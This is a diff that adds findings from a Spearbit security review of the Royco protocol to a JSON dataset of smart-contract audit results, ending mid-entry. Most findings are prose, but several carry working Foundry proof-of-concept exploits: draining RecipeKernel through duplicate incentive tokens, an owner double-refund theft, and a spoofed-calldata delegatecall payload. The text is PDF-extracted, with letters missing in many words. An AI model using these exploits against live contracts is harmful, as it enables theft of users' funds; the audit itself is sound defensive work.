@@ -32498,5 +32498,425 @@
             "Axiom-contracts",
             "Severity: Informational"
         ]
+    },
+    {
+        "title": "Duplicate incentive tokens in IP offers allow draining of funds in RecipeKernel",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "An attacker can drain funds held in the RecipeKernel by exploiting a vulnerability that allows APs to receive excessive rewards if duplicate incentive tokens are provided in the IP offer. The root cause is that IPs can create offers with duplicate incentive tokens. When creating an IP offer, at L199-L201, offer.incentiveAmountsOffered[incentive] keeps track of the total amount of a specic incentive token provided (note the use of +=). However, when the IP offer is lled, at L326-L342, the code iterates through the incentive array, reads offer.incentiveAmountsOffered[incentive] (i.e., the total amount), multiplies it with the ll percentage, and pushes the resulted amount of incentive tokens as rewards to the AP (assuming the market is Upfront type). This causes the total rewards (multiplied by the ll percentage) to be pushed to the AP multiple times. For example, AP will receive double rewards if the array contains two duplicate elements. Impact: High. Funds in RecipeKernel can be drained. The funds kept in RecipeKernel are from other users' IP offers, causing nancial losses to users. Likelihood: High. Attackers can execute the attack by creating and lling their IP offers and extracting funds from the protocol in the same transaction. They can create an upfront market rst if one does not exist. Proof of Concept: The following proof of concept shows that the attacker (both the IP and AP) can drain funds from RecipeKernel: 1. First, IP creates an offer with duplicate incentive tokens: incentivesOffered = [rewardsToken, re- wardsToken] and incentiveAmountsPaid = [2.4 ether, 2.4 ether]. 2. Assume the protocol fee and the market's front-end fee are both 10%. If AP lls the entire offer, they should only receive (2.4 + 2.4) / (1 + 0.1 + 0.1) = 4 ether of incentive tokens. 3. However, AP receives 8 ether of the token due to the double-sending issue. 4. In the end, the attacker spends 4.8 ether but receives 8 ether, resulting in a 3.2 ether prot. pragma solidity >=0.8.0 <0.9.0; import \"forge-std/Test.sol\"; import \"src/PointsFactory.sol\"; import \"src/RecipeKernel.sol\"; import { MockERC20 } from \"test/mocks/MockERC20.sol\"; contract DuplicateIncentivesTest is Test { address owner = makeAddr(\"owner\"); address protocolFeeClaimant = makeAddr(\"protocolFeeClaimant\"); address frontendFeeRecipient = makeAddr(\"frontendFeeRecipient\"); MockERC20 underlying; MockERC20 rewardsToken; PointsFactory pointsFactory; address impl; RecipeKernel recipeKernel; function user(uint256 idx) internal returns (address) { return address(uint160(0x00add2000000000000000000000000000000000000 + idx)); } function setUp() public { vm.startPrank(owner, owner); // deploy 5 underlying = new MockERC20(\"Underlying\", \"Underlying\"); rewardsToken = new MockERC20(\"Reward\", \"Reward\"); pointsFactory = new PointsFactory(owner); impl = address(new WeirollWallet()); recipeKernel = new RecipeKernel(impl, 0, 0, owner, address(pointsFactory)); vm.stopPrank(); for (uint i; i < 10; i++) { // mint users some underlying tokens underlying.mint(user(i), 100 ether); // user approves recipeKernel vm.startPrank(user(i), user(i)); underlying.approve(address(recipeKernel), type(uint256).max); rewardsToken.approve(address(recipeKernel), type(uint256).max); vm.stopPrank(); } // mint IP and recipeKernel some reward tokens rewardsToken.mint(user(2), 100 ether); rewardsToken.mint(address(recipeKernel), 1000 ether); vm.label(owner, \"Owner\"); vm.label(protocolFeeClaimant, \"ProtocolFeeClaimant\"); vm.label(frontendFeeRecipient, \"FrontendFeeRecipient\"); vm.label(user(0), \"MarketCreator\"); vm.label(user(1), \"AP\"); vm.label(user(2), \"IP\"); vm.label(address(underlying), \"Underlying\"); vm.label(address(rewardsToken), \"RewardsToken\"); } function info() internal { console.log(\"===============================================\"); console.log(\"AP balance:\", rewardsToken.balanceOf(user(1))); console.log(\"IP balance:\", rewardsToken.balanceOf(user(2))); console.log(\"recipeKernel balance:\", rewardsToken.balanceOf(address(recipeKernel))); } function test_duplicate_incentives() public { info(); // Step 0. set protocol fee to 10% vm.startPrank(owner, owner); recipeKernel.setProtocolFee(1e17); recipeKernel.setProtocolFeeClaimant(protocolFeeClaimant); vm.stopPrank(); // Step 1. user0 creates a new market RecipeKernelBase.Recipe memory empty = RecipeKernelBase.Recipe({ weirollCommands: new bytes32[](0), weirollState: new bytes[](0) }); vm.startPrank(user(0), user(0)); recipeKernel.createMarket( address(underlying), // inputToken 2 weeks, // lockupTime 1e17, // frontendFee = 10% empty, // depositRecipe empty, // withdrawRecipe RewardStyle.Upfront // rewardStyle ); vm.stopPrank(); // Step 2. user2 (IP) creates an offer with duplicate elements address[] memory rewards = new address[](2); rewards[0] = address(rewardsToken); rewards[1] = address(rewardsToken); uint256[] memory amounts = new uint256[](2); amounts[0] = 2.4 ether; amounts[1] = 2.4 ether; vm.startPrank(user(2), user(2)); 6 uint256 offerID = recipeKernel.createIPOffer( 0, // targetMarketID 10 ether, // quantity 0, // expiry rewards, amounts ); vm.stopPrank(); // Step 3. user1 (AP) fills the entire offer vm.startPrank(user(1), user(1)); uint256[] memory offerIDs = new uint256[](1); offerIDs[0] = offerID; uint256[] memory fillAmounts = new uint256[](1); fillAmounts[0] = 10 ether; recipeKernel.fillIPOffers(offerIDs, fillAmounts, address(0), frontendFeeRecipient); vm.stopPrank(); info(); } } Results: [PASS] test_duplicate_incentives() (gas: 661238) Logs: =============================================== AP balance: 0 IP balance: 100000000000000000000 recipeKernel balance: 1000000000000000000000 =============================================== AP balance: 8000000000000000000 IP balance: 95200000000000000000 recipeKernel balance: 996800000000000000000",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: Critical Risk"
+        ]
+    },
+    {
+        "title": "Setting and refunding intervals enable owner theft and other problems",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "The setRewardsInterval function overwrites the previous reward interval when the previ- ous interval hasn't started. This locks the rewards that were transferred in when the previous interval was set. The storage for tracking active intervals is not correctly updated during refundRewardsInterval which allows owners to steal vault tokens and causes other problems such as: 1) Once the refunded interval starts, setRewardsInterval cannot be called until it ends. 2) Once the refunded interval ends, claimRewards for that reward token can no longer be called 3) Once setRewardsInterval() is called again after the end of the refunded interval, those funds are locked once the new interval starts because claimRewards() still reverts and there is no way to re- trieve the tokens. 7 The setRewardsInterval function is used to set up an interval and transfer in the rewards for new cam- paign on a particular reward token. If there is an existing interval in progress, this function will revert. // A new rewards program can be set if one is not running if ( block.timestamp.toUint32() >= rewardsInterval.start && block.timestamp.toUint32() <= rewardsInterval.end ) revert IntervalInProgress(); When an interval has been set but hasn't started yet, the function does not revert and proceeds to over- write the previously set interval. Because rewards are transferred to the contract at the time the interval is set, the rewards from the previously set interval become locked in the contract. While the refundRewardsInterval refunds the tokens, it does not update storage: /// @param reward The address of the reward for which campaign should be refunded function refundRewardsInterval(address reward) payable external onlyOwner { if (!isReward[reward]) revert InvalidReward(); RewardsInterval storage rewardsInterval = rewardToInterval[reward]; if (block.timestamp >= rewardsInterval.start) revert IntervalInProgress(); uint256 rewardsOwed = (rewardsInterval.rate * (rewardsInterval.end - rewardsInterval.start)) - 1; // Round down if (!POINTS_FACTORY.isPointsProgram(reward)) { ERC20(reward).safeTransfer(msg.sender, rewardsOwed); } (cid:44) } So this creates a situation similar to after a new interval has been set, except there are no tokens avail- able to pay the rewards. When a new interval is not set prior to the beginning of the refunded interval, unexpected behavior ensues. All calls to claim() for the reward token will revert when transfer is attempted in pushReward(): function pushReward(address reward, address to, uint256 amount) internal { (cid:44) // If owed is 0, there is nothing to claim. Check allows any loop calling pushReward to continue without reversion. if (amount == 0) { return; } if (POINTS_FACTORY.isPointsProgram(reward)) { Points(reward).award(to, amount); } else { ERC20(reward).safeTransfer(to, amount); } } Calls to setRewardsInterval will revert because of this check: // A new rewards program can be set if one is not running if (block.timestamp.toUint32() >= rewardsInterval.start && block.timestamp.toUint32() <= rewardsInterval.end) (cid:44) revert IntervalInProgress(); Once the refunded interval ends, when a new interval is created with setInterval those funds are locked because there is no way to retrieve them since claim() still reverts. Impact: A malicious owner can take advantage of the current system: 1) Add the vault token as a reward token. 2) Set an interval on the new \"reward token\". 3) Allow the interval to start and pass, now there are users with unclaimed rewards. 4) Set another interval on the new \"reward token\" for an amount equal to the unclaimed rewards. 5) Refund that interval to get back the original amount transferred. 6) Call refund again to steal unclaimed reward tokens. Proof of Concept: 8 function testproof of conceptRefundInterval() public { vm.warp(block.timestamp + 50 * 52 weeks); // update timestamp // user deposits uint256 depositAmount = 1_000_000e18; MockERC20(address(token)).mint(REGULAR_USER, depositAmount); vm.startPrank(REGULAR_USER); token.approve(address(testIncentivizedVault), type(uint).max); uint256 shares = testIncentivizedVault.deposit(depositAmount, REGULAR_USER); vm.stopPrank(); uint32 start = uint32(block.timestamp + 30 days); uint32 duration = 30 days; MockERC20 rewardTokena1 = rewardToken1; testIncentivizedVault.addRewardsToken(address(rewardTokena1)); // set a rewards interval uint firstRewardsSet = 2000e18; rewardTokena1.mint(address(this), 5000e18); rewardTokena1.approve(address(testIncentivizedVault), 5000e18); testIncentivizedVault.setRewardsInterval(address(rewardTokena1), start, start + duration, firstRewardsSet, DEFAULT_FEE_RECIPIENT); vm.warp(block.timestamp + 61 days); // elapse time past the end of the interval // refund the interval which gets the tokens back but does not update accounting uint secondRewardsSet = 1000e18; start = start + 70 days; duration = 30 days; testIncentivizedVault.setRewardsInterval(address(rewardTokena1), start, start + duration, secondRewardsSet, DEFAULT_FEE_RECIPIENT); testIncentivizedVault.refundRewardsInterval(address(rewardTokena1)); // this allows for refunding the interval again which steals the unclaimed reward tokens owed to the user testIncentivizedVault.refundRewardsInterval(address(rewardTokena1)); (cid:44) (cid:44) }",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: High Risk"
+        ]
+    },
+    {
+        "title": "Chain re-orgs may facilitate improper order fulllment",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "When an IP creates a new offer, the offer is indexed only by numIPOffers which increments with each new offer created. This differs signicantly to AP offer creations which index offers by it's hash, ensuring the fulller of an AP offer always receives the expected incentive amounts. However, because an IP offer is fullled only on offerID, then a chain re-org may allow for a new order to be created under the same offerID but with a malicious market injected or different incentives which are paid to the fulller. Consider the following example:  An honest actor creates a valid IP offer.  Right before this offer is fullled, the chain re-org's, reverting state for the offer creation and full- ment.  A malicious actor sees this and quickly creates a malicious IP offer with the same offerID and ensures that the same order fullment is executed right after.  Two paths are a net negative for the fulller, the replaced IP offer contains a malicious market which allows funds to be stolen when the deposit recipe is executed, or secondly, no incentives are offered and the AP unintentionally enters into false agreement. This also incentivizes intentional re-orgs as strategies emerge to create attractive IP offers which lure fulllers and then the above scenario plays out protably for the malicious actor. It's dangerous to ll orders according to offerID without checking the hash of the IPOffer struct. An order can be created, chain gets re-org'd and then a malicious market can be injected with a deposit recipe which simply gives funds to the IP. Seems important to also store offer.incentiveAmountsPaid = incentiveAmountsPaid in case of a specic re-org edge case. An order might be created by the IP and lled by the AP, but upon re-org, the IP creates a completely different offer with considerably lower incentives paid.",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: High Risk"
+        ]
+    },
+    {
+        "title": "Error in preview rate calculation results in users losing rewards or offers not being allocated",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "The previewRateAfterDeposit() function calculates the rate a user would receive in rewards after depositing assets. However, the incorrect implementation of a check causes the function to return a zero rate for an active reward period, and non-zero before the period starts. An attacker can exploit this error to allocate user's assets to the incentivized vault even though the reward has not started yet, and subsequently get refunded by canceling the reward period. Users will end up getting no rewards at all. On the other hand, users' offer will fail to be allocated to the vaults even though the reward period has started and the rate is high enough because the previewed rate is always zero.",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: High Risk"
+        ]
+    },
+    {
+        "title": "Malicious markets can be injected into orders in the event of a re-org",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "Recipe markets can be instantiated permissionlessly in createMarket() and is indexed by numMarkets which increases for each new instance. AP and IP offers can be created using targetMarketID to indicate which weiroll market to execute the fulllment. However, during a chain re-org, it becomes possible to inject a completely different weiroll market instance that references the same targetMarketID that the IP/AP offer was initially created on. In this case, the offer can be fullled such that a malicious deposit recipe is executed, breaching the offerer's intended commitment to fulll the order according to the parameters dened prior to the re-org. Consider the following example:  A weiroll market is created with valid inputs.  An honest actor creates a valid IP or AP offer referencing targetMarketID as the newly created mar- ket they intend to deposit into.  At some point before or after order fulllment, if a chain re-org occurs and reverts state up and until market creation, then it becomes possible to inject a malicious market. 11  A malicious actor sees this and quickly creates a new market which has the same targetMarketID as the market prior to the chain re-org.  This market contains a malicious deposit recipe which when re-executing offer creation, the same malicious actor can fulll the order and steal funds. This also incentivizes intentional re-orgs as strategies emerge to create attractive IP offers which lure fulllers and then the above scenario plays out protably for the malicious actor.",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: High Risk"
+        ]
+    },
+    {
+        "title": "writeOutputs may read out-of-bounds memory",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "Weiroll VM uses 1-byte indices where the rst bit identies whether the indexed value should be treated as a xed or variable length. The other seven bits are denoted as idx and used to compute what index in the state byte array to look-up. In all cases, idx & IDX_VALUE_MASK should point to the correct position in the state array. It's important that this value does not exist outside of the state array as this would allow potential writes to memory locations containing other variables.",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: Medium Risk"
+        ]
+    },
+    {
+        "title": "writeTuple does not properly index into the state array",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "Each bytes32 command that is to be executed by Weiroll's VM contains a 1-byte flags argu- ment where the rst bit denes a tuple return. In this case, the return for this command will be assigned to the state slot directly, without any attempt at processing or decoding. o is the 1-byte argument used to dene where in state to write the return value to. Indices are always indexed in state by performing state[idx & IDX_VALUE_MASK], whereas the current implementation does not perform a bit AND on idx.",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: Medium Risk"
+        ]
+    },
+    {
+        "title": "Extended commands read the wrong index from the array",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "VM commands contain a 1-byte ag argument which uses each bit to identify additional features and calltype. Command structs would normally contain only a 6-byte list of indices. However, when the extbit has been set, the next command should be treated as a 32-byteinlist of indices. Readingcommands[i++]will actually returnindicesat indexiand noti++ because increment is only processed after the memory array read. the",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: Medium Risk"
+        ]
+    },
+    {
+        "title": "Weiroll value calltypes will read the wrong value amount from the state array",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "Weiroll supports calls with native values attached. When the calltype is FLAG_CT_VALUE- CALL, then according to documentation, the rst argument in the in input list should be taken as the amount passed along with the call. In CommandBuilder.buildInputs(), state is always referenced along with IDX_VALUE_MASK. So to properly read from state, we need to do uint8(bytes1(indices)) & Command- Builder.IDX_VALUE_MASK to get the correct value amount to forward. In the context of Royco, it is hard to dene the impact but it would not seem out of the ordinary for deposit/withdrawal recipes to use value calltypes.",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: Medium Risk"
+        ]
+    },
+    {
+        "title": "Unauthenticated calls can be made to the VM from the wallet implementation contract",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "The combination of using both ClonesWithImmutableArgs and Weiroll VM is made interest- ing because delegatecall is a supported calltype. ClonesWithImmutableArgs is an incredibly gas ecient way to deploy clones where constructor arguments are stored as immutable variables in bytecode instead of in storage. Each delegatecall made to the implementation contract from the proxy will append these immutable arguments to the calldata. The calldata is passed on in the delegatecall as: original calldata + immutable arguments + 2 byte length of immutable args 14 By carefully crafting calls to the implementation contract, the immutable arguments can be spoofed to bypass any checks in the implementation contract that would normally prevent us from calling exe- cuteWeiroll() because onlyRecipeKernel will revert. This means you can execute a delegatecall where the initiating contract is WEIROLL_WALLET_IMPLEMENTATION, targeting a malicious contract which alters state or self-destructs. Fortunately, post-dencun chains are not affected by this because EIP-6780 essentially does not allow for contract state to be deleted unless the contract is self-destructed in the same transaction it was deployed in. In this case, WEIROLL_WALLET_IMPLEMENTATION is deployed in it's own transaction and hence it would not be possible to delete it's state even if it made an unauthenticated delegatecall. We cannot determine what the future implementation for the SELFDESTRUCT opcode will look like and so it's best to be safe about unauthenticated calls from the implementation contract. Weiroll wallets may have signicant lockup times that do not allow their respective owners to take action before a new protocol upgrade takes place. Proof of Concept: function testWalletImplementationDelegatecall() public { // Check if the implementation contract is correctly initialized assertEq(WeirollWallet(payable(WEIROLL_WALLET_IMPLEMENTATION)).owner(), address(0)); assertEq(WeirollWallet(payable(WEIROLL_WALLET_IMPLEMENTATION)).recipeKernel(), address(0)); assertEq(WeirollWallet(payable(WEIROLL_WALLET_IMPLEMENTATION)).amount(), 0); assertEq(WeirollWallet(payable(WEIROLL_WALLET_IMPLEMENTATION)).lockedUntil(), 0); assertFalse(WeirollWallet(payable(WEIROLL_WALLET_IMPLEMENTATION)).isForfeitable()); assertEq(WeirollWallet(payable(WEIROLL_WALLET_IMPLEMENTATION)).marketId(), 0); assertFalse(WeirollWallet(payable(WEIROLL_WALLET_IMPLEMENTATION)).forfeited()); assertFalse(WeirollWallet(payable(WEIROLL_WALLET_IMPLEMENTATION)).executed()); // Mark malicious user as 0xdead address spoofedOwner = address(0xdead); // Deploy a new MockDelegateCallTarget contract MockDelegateCallTarget target = new MockDelegateCallTarget(); // Build payload to attempt to self destruct the implementation contract bytes memory payload; bytes4 executeWeirollFunctionSig = WeirollWallet(payable(WEIROLL_WALLET_IMPLEMENTATION)).executeWeiroll.selector; payload = bytes.concat(payload, abi.encodePacked(executeWeirollFunctionSig)); payload = bytes.concat(payload, hex\"0000000000000000000000000000000000000000000000000000000000000040\"); payload = bytes.concat(payload, hex\"0000000000000000000000000000000000000000000000000000000000000080\"); payload = bytes.concat(payload, hex\"0000000000000000000000000000000000000000000000000000000000000001\"); bytes4 selfDestructFunctionSig = target.selfDestruct.selector; payload = bytes.concat(payload, abi.encodePacked(selfDestructFunctionSig)); payload = bytes.concat(payload, hex\"00ff0000000000ff\"); payload = bytes.concat(payload, abi.encodePacked(address(target))); payload = bytes.concat(payload, hex\"0000000000000000000000000000000000000000000000000000000000000000\"); bytes memory data = abi.encodePacked(payload, spoofedOwner, spoofedOwner, uint256(1), uint256(block.timestamp + 1), true, uint256(1), bytes1(uint8(0)), bytes1(uint8(137))); (cid:44) (cid:44) // Perform call to implementation contract with custom calldata attached vm.prank(address(0xdead)); (bool success, bytes memory retData) = WEIROLL_WALLET_IMPLEMENTATION.call(data); // Check if the call was successful assertTrue(success); // Check if implementation and target address still have code after attempt to self destruct address implementationAddress = WEIROLL_WALLET_IMPLEMENTATION; uint32 sizeI; uint32 sizeT; assembly { sizeI := extcodesize(implementationAddress) sizeT := extcodesize(target) } assertGt(sizeI, 0); assertGt(sizeT, 0); // Check if the implementation contract executed the weiroll commands assertTrue(WeirollWallet(payable(WEIROLL_WALLET_IMPLEMENTATION)).executed()); // Self destruct halts the execution of the target contract, so the executed flag should remain false assertFalse(target.executed()); 15 } contract MockDelegateCallTarget { bool public executed; constructor() {} function selfDestruct() external { executed = true; selfdestruct(payable(address(0xdead))); } }",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: Medium Risk"
+        ]
+    },
+    {
+        "title": "Offers can be allocated to incentivized vaults with a reward period shorter than the mini- mum requirement",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "The end - start < MIN_CAMPAIGN_DURATION check ensures offers are only allocated if the reward period will last for some minimum duration to prevent last-minute rate ination attacks. However, the check compares the end time with the start time instead of the current time, allowing offers to be allocated regardless of the remaining time of the rewards campaign.",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: Medium Risk"
+        ]
+    },
+    {
+        "title": "Rewards distributed during periods with no active depositors are locked in the incentivized vaults",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "Every vault has 10,000 shares minted to the zero address (see L140). During an active reward period, if no user has deposited into the vault, all the rewards will be distributed to the zero address and effectively locked in the contract. Even if no shares are minted to the zero address in the rst place, this issue still exists because rewardsPer- TokenOut.lastUpdated will be updated in _calculateRewardsPerToken() if the elapsed time is greater than 0, regardless of the total supply.",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: Medium Risk"
+        ]
+    },
+    {
+        "title": "redeem function will always revert due to double asset transfer",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "The redeem function has an incorrect sequence of asset transfers that causes it to always revert, making it impossible for users to execute the function successfully. Here's the breakdown of the issue:  L534: assets = VAULT.redeem(shares, receiver, address(this)); this will burn the amount of shares of the underlying vault in the contract and transfer underlying asset to receiver.  L536: _burn(owner, shares); this will burn the shares of the WrappedVault.  L537: DEPOSIT_ASSET.safeTransfer(receiver, assets); this line will revert bacause there is no DEPOSIT_ASSET balance in this contract, and DEPOSIT_ASSET was already transfered in previous line.",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: Low Risk"
+        ]
+    },
+    {
+        "title": "Grief through salt collision due to abi.encodePacked on createPointsProgram(...)",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "The createPointsProgram function computes the salt for contract creation using abi.encodePacked with dynamic string parameters _name and _symbol. This approach can lead to hash collisions because abi.encodePacked concatenates dynamic types without length encoding, potentially causing different inputs to produce the same hash and fail contract creation. An attacker could exploit this by front-running transactions and submitting manipulated _name and _- symbol values that result in the same salt, causing the original user's contract creation to fail. Furthermore this will deploy a Points contract with different name and symbol.",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: Low Risk"
+        ]
+    },
+    {
+        "title": "AP's offer cannot be lled if the remaining ratio is lower than a certain percentage",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "The minimum ll percentage check prevents a grieng attack where a malicious IP can ll an AP's offer multiple times with small amounts, causing AP to incur signicant gas fees to withdraw funds from their wallets. However, this check causes another issue. MIN_FILL_PERCENT is 25%, so if an IP lls 75% to 100% of the offer (non-inclusive), the rest cannot be lled anymore. APs must create another offer, but the same issue can happen again. Note that APs do not lose funds, but it's inconvenient and can often happen in regular use cases.",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: Low Risk"
+        ]
+    },
+    {
+        "title": "Potential ll-and-forfeit attack on IPs",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "Malicious APs can execute a ll-and-forfeit attack on IPs:  Scenario 1: 1. AP creates an offer. 2. IP lls the offer. AP forfeits their rewards and unlocks the wallet immediately. 3. Result: IP loses part of the rewards as the protocol fees.  Scenario 2: 1. IP creates an offer. 2. AP lls the offer. 3. After the offer's expiry but before the wallet's unlock time, AP forfeits their rewards and unlocks the wallet early. 4. Result: IP loses part of the rewards as the protocol fees. Scenario 2 is less of an issue because the malicious AP has to wait for the offer to expire. In Scenario 1, it is not possible to check the offer's expiry because AP offers are not stored on-chain.",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: Low Risk"
+        ]
+    },
+    {
+        "title": "Front-end and protocol fees are not accounted until users claim their rewards",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "If a market's reward style is Arrear or Forfeitable, the fees to the front-end and protocol are accounted only when the users (i.e., wallet owners) call claim(). In other words, if a user does not call claim() at all for any reason, even after the wallet's lockup period ends, the front-end or protocol will not be able to get the fees from the RecipeKernel.",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: Low Risk"
+        ]
+    },
+    {
+        "title": "Checking the wallet type to prevent unexpected calls to the claim() and forfeit() function",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "claim(). Although no additional rewards will be sent out since LockedRewardParams storage params is uninitialized, there can be an explicit check at the beginning of the function, e.g., if (marketIDToWeirollMarket[wallet.marketId()] == Upfront) revert AlreadyRewarded(); Similarly, params.incentives.length == 0 can be checked at the beginning of the claim() function and return early. The condition will hold if the params storage has been deleted after a previous claim. The forfeit() function can also implement a check to avoid wallets of upfront markets from calling it, though a similar check already exists in WeirollWallet.forfeit().",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: Low Risk"
+        ]
+    },
+    {
+        "title": "Ination attacks on the underlying vaults may affect the rst depositor of the WrappedVault",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "The rst depositor to the WrappedVault may still be exploited by ination attacks executed on the underlying vault, even though dead shares are minted in the WrappedVault. It is because WrappedVault acts similarly to a proxy that transfers funds from users to the underlying vault and always mints the same number of shares it receives from the underlying vault. If the exchange rate of the underlying vault is manipulated, it directly affects how many shares the depositor will receive from the WrappedVault. In other words, whether the WrappedVault is vulnerable to ination attacks mainly depends on the under- lying vault implementation.",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: Low Risk"
+        ]
+    },
+    {
+        "title": "Potential read-only reentrancy during the withdrawal from the underlying vault",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "The WrappedVault.withdraw() function executes an external call to VAULT.withdraw() be- fore _burn(). This causes the wrapped vault contract to be in an intermediate state during the execution of withdraw(). If another contract reads totalSupply() or previewRateAfterDeposit() during this pe- riod for any reason, similar to read-only reentrancy, the return value will be inaccurate because the total supply has not been updated yet. This also applies to the redeem() function.",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: Low Risk"
+        ]
+    },
+    {
+        "title": "Offers with indenite expiry cannot be cancelled",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "In the RecipeKernel contract, the cancelAPOffer and cancelIPOffer functions include a condition that prevents users from canceling offers if the expiry is indenite (is set to zero): if (offer.expiry == 0) revert OfferCannotExpire(); An expiry value of zero signies that an offer never expires. Due to this check, users are unable to cancel their own offers that have no expiry date",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: Low Risk"
+        ]
+    },
+    {
+        "title": "Inaccurate reward distribution if reward period is set to start in the past",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "Setting rewards in the past does not consider how long the users have staked already but only their staked amount, which has a different behavior than setting future rewards. Consider the fol- lowing scenario: vm.warp(4 weeks); deposit(user(0), 1 ether); vm.warp(5 weeks); deposit(user(1), 1 ether); vm.warp(6 weeks); setRewardsInterval(address(rewardsToken), 4 weeks, 8 weeks, 4 ether); vm.warp(10 weeks); claim(user(0)); claim(user(1)); rewardsToken.balanceOf(user(0)); // about 2 ether rewardsToken.balanceOf(user(1)); // about 2 ether Since User 0 staked one more week than User 1, the rewards should be distributed 4:3. However, both users get the same amount of 2 ether as rewards.",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: Low Risk"
+        ]
+    },
+    {
+        "title": "Remove unnecessary check",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "The condition rewardsInterval.end < newStart is not possible since newStart will either be previous start or block.timestamp and the previous start can't be greater than the previous end. Ad- ditionally, at the top of this function on line 223 we ensure block.timestamp < rewardsInterval.end.",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: Gas Optimization"
+        ]
+    },
+    {
+        "title": "Remove unnecessary early returrn",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "The totalSupply_ will never be equal to 0 since 10,000 is burned in the constructor.",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: Gas Optimization"
+        ]
+    },
+    {
+        "title": "Remove unused storage",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "allowedVaults is stored as a public variable, but it is not used.",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: Gas Optimization"
+        ]
+    },
+    {
+        "title": "Calls to ERC4626(offer.targetVault).asset() can be cached",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
+        "body": "In the allocateOffer function, the method ERC4626(offer.targetVault).asset() is called multiple times. Each call to this function incurs gas costs, especially if it involves external calls or compu- tations.",
+        "labels": [
+            "Spearbit",
+            "Royco",
+            "Severity: Gas Optimization"
+        ]
+    },
+    {
+        "title": "Reduce contract size by switching from Solmate to Solady libraries",
+        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Royco-Spearbit-Security-Review-October-2024.pdf",
